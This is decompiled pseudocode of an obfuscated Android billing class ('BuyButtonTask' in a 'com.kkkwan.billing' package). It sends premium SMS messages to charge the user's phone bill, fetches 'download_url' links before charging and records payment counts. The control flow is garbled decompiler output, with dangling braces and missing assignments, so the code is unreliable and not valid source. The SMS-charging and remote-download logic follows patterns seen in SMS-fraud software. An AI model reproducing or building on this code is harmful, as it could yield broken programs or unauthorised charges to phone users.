public class inal extends android.os.AsyncTask {
	 /* # static fields */
	 public static java.util.List a;
	 /* # instance fields */
	 private android.app.Activity b;
	 private java.lang.String c;
	 private java.lang.String d;
	 private java.lang.String e;
	 private java.lang.String f;
	 private android.app.ProgressDialog g;
	 /* # direct methods */
	 public inal ( ) {
		 /* .locals 2 */
		 /* invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V */
		 try { // :try_start_0
			 final String v0 = "BuyButtonTask"; // const-string v0, "BuyButtonTask"
			 final String v1 = "\u6267\u884c\u5f02\u6b65\u7ebf\u7a0b\u6784\u9020\u65b9\u6cd5"; // const-string v1, "\u6267\u884c\u5f02\u6b65\u7ebf\u7a0b\u6784\u9020\u65b9\u6cd5"
			 com.kkkwan.billing.h.f .a ( v0,v1 );
			 this.b = p1;
			 this.c = p2;
			 this.d = p3;
			 this.e = p4;
			 this.f = p5;
			 /* :try_end_0 */
			 /* .catch Ljava/lang/Exception; {:try_start_0 ..:try_end_0} :catch_0 */
		 } // :goto_0
		 return;
		 /* :catch_0 */
		 /* move-exception v0 */
		 (( java.lang.Exception ) v0 ).printStackTrace ( ); // invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
	 } // .end method
	 private java.lang.String a ( ) {
		 /* .locals 10 */
		 int v1 = 0; // const/4 v1, 0x0
		 try { // :try_start_0
			 final String v0 = "BuyButtonTask"; // const-string v0, "BuyButtonTask"
			 final String v2 = "\u6267\u884c\u5f02\u6b65\u64cd\u4f5c\u4e2d"; // const-string v2, "\u6267\u884c\u5f02\u6b65\u64cd\u4f5c\u4e2d"
			 com.kkkwan.billing.h.f .a ( v0,v2 );
			 v0 = this.b;
			 v0 = 			 com.kkkwan.billing.c.h .a ( v0 );
			 /* if-nez v0, :cond_0 */
			 final String v0 = "sim_not_available"; // const-string v0, "sim_not_available"
		 } // :goto_0
	 } // :cond_0
	 final String v0 = "BuyButtonTask"; // const-string v0, "BuyButtonTask"
	 final String v2 = "\u53d1\u77ed\u4fe1\u6263\u8d39\u524d\uff0c\u67e5\u770b\u662f\u5426\u9700\u8981\u4e0b\u8f7d\u94fe\u63a5"; // const-string v2, "\u53d1\u77ed\u4fe1\u6263\u8d39\u524d\uff0c\u67e5\u770b\u662f\u5426\u9700\u8981\u4e0b\u8f7d\u94fe\u63a5"
	 com.kkkwan.billing.h.f .a ( v0,v2 );
	 /* new-instance v4, Lcom/kkkwan/billing/c/a/a; */
	 /* invoke-direct {v4}, Lcom/kkkwan/billing/c/a/a;-><init>()V */
	 v0 = this.b;
	 com.kkkwan.billing.c.f .b ( v0 );
	 (( com.kkkwan.billing.b.b ) v0 ).b ( ); // invoke-virtual {v0}, Lcom/kkkwan/billing/b/b;->b()Ljava/util/List;
	 v0 = this.d;
	 final String v2 = "###"; // const-string v2, "###"
	 (( java.lang.String ) v0 ).split ( v2 ); // invoke-virtual {v0, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;
	 /* new-instance v0, Ljava/util/ArrayList; */
	 /* invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V */
	 /* move v0, v1 */
} // :goto_1
/* array-length v2, v6 */
/* if-ge v0, v2, :cond_1 */
v2 = com.kkkwan.billing.g.a.a;
/* aget-object v3, v6, v0 */
/* add-int/lit8 v0, v0, 0x1 */
} // :cond_1
/* move v3, v1 */
} // :goto_2
/* array-length v0, v6 */
/* if-ge v3, v0, :cond_5 */
/* move v2, v1 */
v0 = } // :goto_3
/* if-ge v2, v0, :cond_4 */
/* check-cast v0, Lcom/kkkwan/billing/b/c; */
/* aget-object v7, v6, v3 */
(( com.kkkwan.billing.b.c ) v0 ).a ( ); // invoke-virtual {v0}, Lcom/kkkwan/billing/b/c;->a()Ljava/lang/String;
v7 = (( java.lang.String ) v7 ).equals ( v8 ); // invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
if ( v7 != null) { // if-eqz v7, :cond_2
(( com.kkkwan.billing.b.c ) v0 ).i ( ); // invoke-virtual {v0}, Lcom/kkkwan/billing/b/c;->i()Ljava/lang/String;
final String v7 = "BuyButtonTask"; // const-string v7, "BuyButtonTask"
/* new-instance v8, Ljava/lang/StringBuilder; */
final String v9 = "download_url="; // const-string v9, "download_url="
/* invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
(( java.lang.StringBuilder ) v8 ).append ( v0 ); // invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
(( java.lang.StringBuilder ) v8 ).toString ( ); // invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
com.kkkwan.billing.h.f .a ( v7,v8 );
if ( v0 != null) { // if-eqz v0, :cond_3
final String v7 = ""; // const-string v7, ""
v7 = (( java.lang.String ) v7 ).equals ( v0 ); // invoke-virtual {v7, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
/* if-nez v7, :cond_3 */
v7 = this.b;
(( com.kkkwan.billing.c.a.a ) v4 ).a ( v7, v0 ); // invoke-virtual {v4, v7, v0}, Lcom/kkkwan/billing/c/a/a;->a(Landroid/content/Context;Ljava/lang/String;)V
} // :cond_2
} // :goto_4
/* add-int/lit8 v0, v2, 0x1 */
/* move v2, v0 */
} // :cond_3
final String v0 = "BuyButtonTask"; // const-string v0, "BuyButtonTask"
final String v7 = "download_url\u4e0b\u8f7d\u94fe\u63a5\u4e3a\u7a7a\uff0c\u4e0d\u7528\u4e0b\u8f7d"; // const-string v7, "download_url\u4e0b\u8f7d\u94fe\u63a5\u4e3a\u7a7a\uff0c\u4e0d\u7528\u4e0b\u8f7d"
com.kkkwan.billing.h.f .a ( v0,v7 );
/* :try_end_0 */
/* .catch Ljava/lang/Exception; {:try_start_0 ..:try_end_0} :catch_0 */
/* :catch_0 */
/* move-exception v0 */
(( java.lang.Exception ) v0 ).printStackTrace ( ); // invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
final String v0 = "pay_fail"; // const-string v0, "pay_fail"
/* goto/16 :goto_0 */
} // :cond_4
/* add-int/lit8 v0, v3, 0x1 */
/* move v3, v0 */
} // :cond_5
try { // :try_start_1
v0 = this.c;
final String v2 = "###"; // const-string v2, "###"
(( java.lang.String ) v0 ).split ( v2 ); // invoke-virtual {v0, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;
/* move v0, v1 */
} // :goto_5
/* array-length v3, v2 */
/* if-ge v0, v3, :cond_6 */
final String v3 = "BuyButtonTask"; // const-string v3, "BuyButtonTask"
/* new-instance v4, Ljava/lang/StringBuilder; */
final String v5 = "sms["; // const-string v5, "sms["
/* invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
(( java.lang.StringBuilder ) v4 ).append ( v0 ); // invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
final String v5 = "]"; // const-string v5, "]"
(( java.lang.StringBuilder ) v4 ).append ( v5 ); // invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
/* aget-object v5, v2, v0 */
(( java.lang.StringBuilder ) v4 ).append ( v5 ); // invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
(( java.lang.StringBuilder ) v4 ).toString ( ); // invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
com.kkkwan.billing.h.f .a ( v3,v4 );
/* aget-object v3, v2, v0 */
int v4 = 0; // const/4 v4, 0x0
/* aget-object v5, v2, v0 */
final String v7 = ","; // const-string v7, ","
v5 = (( java.lang.String ) v5 ).indexOf ( v7 ); // invoke-virtual {v5, v7}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I
(( java.lang.String ) v3 ).substring ( v4, v5 ); // invoke-virtual {v3, v4, v5}, Ljava/lang/String;->substring(II)Ljava/lang/String;
/* aget-object v4, v2, v0 */
v5 = (( java.lang.String ) v3 ).length ( ); // invoke-virtual {v3}, Ljava/lang/String;->length()I
/* add-int/lit8 v5, v5, 0x1 */
(( java.lang.String ) v4 ).substring ( v5 ); // invoke-virtual {v4, v5}, Ljava/lang/String;->substring(I)Ljava/lang/String;
final String v5 = "BuyButtonTask"; // const-string v5, "BuyButtonTask"
/* new-instance v7, Ljava/lang/StringBuilder; */
final String v8 = "\u77ed\u4fe1\u53f7\u7801\uff0cnumber"; // const-string v8, "\u77ed\u4fe1\u53f7\u7801\uff0cnumber"
/* invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
(( java.lang.StringBuilder ) v7 ).append ( v3 ); // invoke-virtual {v7, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
(( java.lang.StringBuilder ) v7 ).toString ( ); // invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
com.kkkwan.billing.h.f .a ( v5,v7 );
final String v5 = "BuyButtonTask"; // const-string v5, "BuyButtonTask"
/* new-instance v7, Ljava/lang/StringBuilder; */
final String v8 = "\u77ed\u4fe1\u5185\u5bb9\uff0ccontent="; // const-string v8, "\u77ed\u4fe1\u5185\u5bb9\uff0ccontent="
/* invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
(( java.lang.StringBuilder ) v7 ).append ( v4 ); // invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
(( java.lang.StringBuilder ) v7 ).toString ( ); // invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
com.kkkwan.billing.h.f .a ( v5,v7 );
final String v5 = "BuyButtonTask"; // const-string v5, "BuyButtonTask"
/* new-instance v7, Ljava/lang/StringBuilder; */
final String v8 = "\u53d1\u9001\u7b2c"; // const-string v8, "\u53d1\u9001\u7b2c"
/* invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
/* add-int/lit8 v8, v0, 0x1 */
(( java.lang.StringBuilder ) v7 ).append ( v8 ); // invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
final String v8 = "\u6761\u77ed\u4fe1"; // const-string v8, "\u6761\u77ed\u4fe1"
(( java.lang.StringBuilder ) v7 ).append ( v8 ); // invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
(( java.lang.StringBuilder ) v7 ).toString ( ); // invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
com.kkkwan.billing.h.f .a ( v5,v7 );
/* new-instance v5, Lcom/kkkwan/billing/c/b/a; */
/* invoke-direct {v5}, Lcom/kkkwan/billing/c/b/a;-><init>()V */
final String v7 = "BuyButtonTask"; // const-string v7, "BuyButtonTask"
/* new-instance v8, Ljava/lang/StringBuilder; */
final String v9 = "\u53d1\u9001\u77ed\u4fe1\u65f6\uff0cids2["; // const-string v9, "\u53d1\u9001\u77ed\u4fe1\u65f6\uff0cids2["
/* invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
(( java.lang.StringBuilder ) v8 ).append ( v0 ); // invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
final String v9 = "]="; // const-string v9, "]="
(( java.lang.StringBuilder ) v8 ).append ( v9 ); // invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
/* aget-object v9, v6, v0 */
(( java.lang.StringBuilder ) v8 ).append ( v9 ); // invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
(( java.lang.StringBuilder ) v8 ).toString ( ); // invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
com.kkkwan.billing.h.f .a ( v7,v8 );
v7 = this.b;
(( com.kkkwan.billing.c.b.a ) v5 ).a ( v7, v3, v4 ); // invoke-virtual {v5, v7, v3, v4}, Lcom/kkkwan/billing/c/b/a;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
/* add-int/lit8 v0, v0, 0x1 */
/* goto/16 :goto_5 */
} // :cond_6
final String v0 = "BuyButtonTask"; // const-string v0, "BuyButtonTask"
final String v2 = "\u8bb0\u5f55\u7528\u6237\u8bdd\u8d39\u652f\u4ed8\u6b21\u6570"; // const-string v2, "\u8bb0\u5f55\u7528\u6237\u8bdd\u8d39\u652f\u4ed8\u6b21\u6570"
com.kkkwan.billing.h.f .a ( v0,v2 );
v0 = this.b;
final String v2 = "upline"; // const-string v2, "upline"
final String v3 = "upline"; // const-string v3, "upline"
com.kkkwan.billing.e.b.a .a ( v0,v2,v3 );
java.lang.Integer .valueOf ( v0 );
v0 = (( java.lang.Integer ) v0 ).intValue ( ); // invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I
/* add-int/lit8 v0, v0, 0x1 */
java.lang.String .valueOf ( v0 );
v2 = this.b;
final String v3 = "upline"; // const-string v3, "upline"
final String v4 = "upline"; // const-string v4, "upline"
com.kkkwan.billing.e.b.a .a ( v2,v3,v0,v4 );
final String v0 = "BuyButtonTask"; // const-string v0, "BuyButtonTask"
final String v2 = "\u8bb0\u5f55\u6b21\u6570\u5230\u6570\u636e\u5e93"; // const-string v2, "\u8bb0\u5f55\u6b21\u6570\u5230\u6570\u636e\u5e93"
com.kkkwan.billing.h.f .a ( v0,v2 );
/* new-instance v2, Lcom/kkkwan/billing/a; */
v0 = this.b;
/* invoke-direct {v2, v0}, Lcom/kkkwan/billing/a;-><init>(Landroid/content/Context;)V */
/* move v0, v1 */
} // :goto_6
/* array-length v1, v6 */
/* if-ge v0, v1, :cond_8 */
final String v1 = "BuyButtonTask"; // const-string v1, "BuyButtonTask"
/* new-instance v3, Ljava/lang/StringBuilder; */
final String v4 = "ids2["; // const-string v4, "ids2["
/* invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
(( java.lang.StringBuilder ) v3 ).append ( v0 ); // invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
final String v4 = "]="; // const-string v4, "]="
(( java.lang.StringBuilder ) v3 ).append ( v4 ); // invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
/* aget-object v4, v6, v0 */
(( java.lang.StringBuilder ) v3 ).append ( v4 ); // invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
(( java.lang.StringBuilder ) v3 ).toString ( ); // invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
com.kkkwan.billing.h.f .a ( v1,v3 );
/* aget-object v1, v6, v0 */
v3 = this.b;
v3 = (( com.kkkwan.billing.a ) v2 ).b ( v1, v3 ); // invoke-virtual {v2, v1, v3}, Lcom/kkkwan/billing/a;->b(Ljava/lang/String;Landroid/content/Context;)Z
if ( v3 != null) { // if-eqz v3, :cond_7
v3 = this.b;
(( com.kkkwan.billing.a ) v2 ).a ( v1, v3 ); // invoke-virtual {v2, v1, v3}, Lcom/kkkwan/billing/a;->a(Ljava/lang/String;Landroid/content/Context;)Lcom/kkkwan/billing/e/a/b;
(( com.kkkwan.billing.e.a.b ) v3 ).b ( ); // invoke-virtual {v3}, Lcom/kkkwan/billing/e/a/b;->b()Ljava/lang/String;
java.lang.Integer .valueOf ( v3 );
v3 = (( java.lang.Integer ) v3 ).intValue ( ); // invoke-virtual {v3}, Ljava/lang/Integer;->intValue()I
/* add-int/lit8 v3, v3, 0x1 */
java.lang.String .valueOf ( v3 );
v4 = this.b;
(( com.kkkwan.billing.a ) v2 ).a ( v1, v4 ); // invoke-virtual {v2, v1, v4}, Lcom/kkkwan/billing/a;->a(Ljava/lang/String;Landroid/content/Context;)Lcom/kkkwan/billing/e/a/b;
(( com.kkkwan.billing.e.a.b ) v4 ).c ( ); // invoke-virtual {v4}, Lcom/kkkwan/billing/e/a/b;->c()Ljava/lang/String;
java.lang.Integer .valueOf ( v4 );
v4 = (( java.lang.Integer ) v4 ).intValue ( ); // invoke-virtual {v4}, Ljava/lang/Integer;->intValue()I
/* add-int/lit8 v4, v4, 0x1 */
java.lang.String .valueOf ( v4 );
final String v5 = "BuyButtonTask"; // const-string v5, "BuyButtonTask"
final String v7 = "\u66f4\u65b0\u6570\u636e\u5e93"; // const-string v7, "\u66f4\u65b0\u6570\u636e\u5e93"
com.kkkwan.billing.h.f .a ( v5,v7 );
/* new-instance v5, Lcom/kkkwan/billing/e/a/b; */
/* invoke-direct {v5, v1, v3, v4}, Lcom/kkkwan/billing/e/a/b;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V */
v1 = this.b;
(( com.kkkwan.billing.a ) v2 ).b ( v5, v1 ); // invoke-virtual {v2, v5, v1}, Lcom/kkkwan/billing/a;->b(Lcom/kkkwan/billing/e/a/b;Landroid/content/Context;)V
} // :cond_7
/* add-int/lit8 v0, v0, 0x1 */
} // :cond_8
(( com.kkkwan.billing.a ) v2 ).a ( ); // invoke-virtual {v2}, Lcom/kkkwan/billing/a;->a()V
final String v0 = "pay_succes"; // const-string v0, "pay_succes"
/* :try_end_1 */
/* .catch Ljava/lang/Exception; {:try_start_1 ..:try_end_1} :catch_0 */
/* goto/16 :goto_0 */
} // .end method
/* # virtual methods */
protected final java.lang.Object doInBackground ( java.lang.Object[] p0 ) { //synthethic
/* .locals 1 */
/* invoke-direct {p0}, Lcom/kkkwan/billing/g/a;->a()Ljava/lang/String; */
} // .end method
protected final void onPostExecute ( java.lang.Object p0 ) { //synthethic
/* .locals 4 */
/* check-cast p1, Ljava/lang/String; */
/* invoke-super {p0, p1}, Landroid/os/AsyncTask;->onPostExecute(Ljava/lang/Object;)V */
try { // :try_start_0
final String v0 = "BuyButtonTask"; // const-string v0, "BuyButtonTask"
final String v1 = "\u5f02\u6b65\u64cd\u4f5c\u6267\u884c\u7ed3\u675f"; // const-string v1, "\u5f02\u6b65\u64cd\u4f5c\u6267\u884c\u7ed3\u675f"
com.kkkwan.billing.h.f .a ( v0,v1 );
final String v0 = "sim_not_available"; // const-string v0, "sim_not_available"
v0 = (( java.lang.String ) v0 ).equals ( p1 ); // invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
if ( v0 != null) { // if-eqz v0, :cond_1
v0 = this.b;
final String v1 = "SIM\u5361\u4e0d\u53ef\u7528\uff0c\u8bf7\u68c0\u67e5SIM\u5361\uff01"; // const-string v1, "SIM\u5361\u4e0d\u53ef\u7528\uff0c\u8bf7\u68c0\u67e5SIM\u5361\uff01"
int v2 = 1; // const/4 v2, 0x1
android.widget.Toast .makeText ( v0,v1,v2 );
(( android.widget.Toast ) v0 ).show ( ); // invoke-virtual {v0}, Landroid/widget/Toast;->show()V
} // :cond_0
} // :goto_0
return;
} // :cond_1
final String v0 = "pay_succes"; // const-string v0, "pay_succes"
v0 = (( java.lang.String ) v0 ).equals ( p1 ); // invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
if ( v0 != null) { // if-eqz v0, :cond_4
v0 = this.g;
if ( v0 != null) { // if-eqz v0, :cond_2
v0 = this.g;
(( android.app.ProgressDialog ) v0 ).dismiss ( ); // invoke-virtual {v0}, Landroid/app/ProgressDialog;->dismiss()V
int v0 = 0; // const/4 v0, 0x0
this.g = v0;
} // :cond_2
v0 = this.b;
final String v1 = "\u652f\u4ed8\u6210\u529f\uff0c\u5982\u6709\u95ee\u9898\u8bf7\u8054\u7cfb\u5ba2\u670d\uff01"; // const-string v1, "\u652f\u4ed8\u6210\u529f\uff0c\u5982\u6709\u95ee\u9898\u8bf7\u8054\u7cfb\u5ba2\u670d\uff01"
int v2 = 1; // const/4 v2, 0x1
android.widget.Toast .makeText ( v0,v1,v2 );
(( android.widget.Toast ) v0 ).show ( ); // invoke-virtual {v0}, Landroid/widget/Toast;->show()V
v0 = this.b;
(( android.app.Activity ) v0 ).finish ( ); // invoke-virtual {v0}, Landroid/app/Activity;->finish()V
/* new-instance v0, Lcom/kkkwan/billing/h/g; */
/* invoke-direct {v0}, Lcom/kkkwan/billing/h/g;-><init>()V */
v1 = this.b;
(( com.kkkwan.billing.h.g ) v0 ).c ( v1 ); // invoke-virtual {v0, v1}, Lcom/kkkwan/billing/h/g;->c(Landroid/content/Context;)Ljava/lang/String;
final String v1 = "0"; // const-string v1, "0"
final String v2 = "quick_pay"; // const-string v2, "quick_pay"
v3 = this.f;
v2 = (( java.lang.String ) v2 ).equals ( v3 ); // invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
if ( v2 != null) { // if-eqz v2, :cond_3
com.kkkwan.billing.f.a .a ( );
v3 = this.e;
(( com.kkkwan.billing.f.a ) v2 ).c ( v1, v3, v0 ); // invoke-virtual {v2, v1, v3, v0}, Lcom/kkkwan/billing/f/a;->c(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
/* :try_end_0 */
/* .catch Ljava/lang/Exception; {:try_start_0 ..:try_end_0} :catch_0 */
/* :catch_0 */
/* move-exception v0 */
(( java.lang.Exception ) v0 ).printStackTrace ( ); // invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
} // :cond_3
try { // :try_start_1
final String v2 = "quota_pay"; // const-string v2, "quota_pay"
v3 = this.f;
v2 = (( java.lang.String ) v2 ).equals ( v3 ); // invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
if ( v2 != null) { // if-eqz v2, :cond_0
com.kkkwan.billing.f.a .a ( );
v3 = this.e;
(( com.kkkwan.billing.f.a ) v2 ).a ( v1, v3, v0 ); // invoke-virtual {v2, v1, v3, v0}, Lcom/kkkwan/billing/f/a;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
} // :cond_4
v0 = this.b;
final String v1 = "\u652f\u4ed8 \u5931\u8d25\uff0c\u5982\u6709\u95ee\u9898\u8bf7\u8054\u7cfb\u5ba2\u670d\uff01"; // const-string v1, "\u652f\u4ed8 \u5931\u8d25\uff0c\u5982\u6709\u95ee\u9898\u8bf7\u8054\u7cfb\u5ba2\u670d\uff01"
int v2 = 1; // const/4 v2, 0x1
android.widget.Toast .makeText ( v0,v1,v2 );
(( android.widget.Toast ) v0 ).show ( ); // invoke-virtual {v0}, Landroid/widget/Toast;->show()V
/* :try_end_1 */
/* .catch Ljava/lang/Exception; {:try_start_1 ..:try_end_1} :catch_0 */
} // .end method
protected final void onPreExecute ( ) {
/* .locals 3 */
try { // :try_start_0
final String v0 = "BuyButtonTask"; // const-string v0, "BuyButtonTask"
final String v1 = "\u5f00\u59cb\u6267\u884c\u5f02\u6b65\u7ebf\u7a0b"; // const-string v1, "\u5f00\u59cb\u6267\u884c\u5f02\u6b65\u7ebf\u7a0b"
com.kkkwan.billing.h.f .a ( v0,v1 );
v0 = this.g;
if ( v0 != null) { // if-eqz v0, :cond_0
v0 = this.g;
(( android.app.ProgressDialog ) v0 ).dismiss ( ); // invoke-virtual {v0}, Landroid/app/ProgressDialog;->dismiss()V
int v0 = 0; // const/4 v0, 0x0
this.g = v0;
} // :cond_0
v0 = this.b;
int v1 = 0; // const/4 v1, 0x0
final String v2 = "\u6b63\u5728\u652f\u4ed8\uff0c\u8bf7\u7a0d\u7b49..."; // const-string v2, "\u6b63\u5728\u652f\u4ed8\uff0c\u8bf7\u7a0d\u7b49..."
android.app.ProgressDialog .show ( v0,v1,v2 );
this.g = v0;
/* invoke-super {p0}, Landroid/os/AsyncTask;->onPreExecute()V */
/* :try_end_0 */
/* .catch Ljava/lang/Exception; {:try_start_0 ..:try_end_0} :catch_0 */
} // :goto_0
return;
/* :catch_0 */
/* move-exception v0 */
(( java.lang.Exception ) v0 ).printStackTrace ( ); // invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
} // .end method
protected final void onProgressUpdate ( java.lang.Object[] p0 ) { //bridge//synthethic
/* .locals 0 */
return;
} // .end method
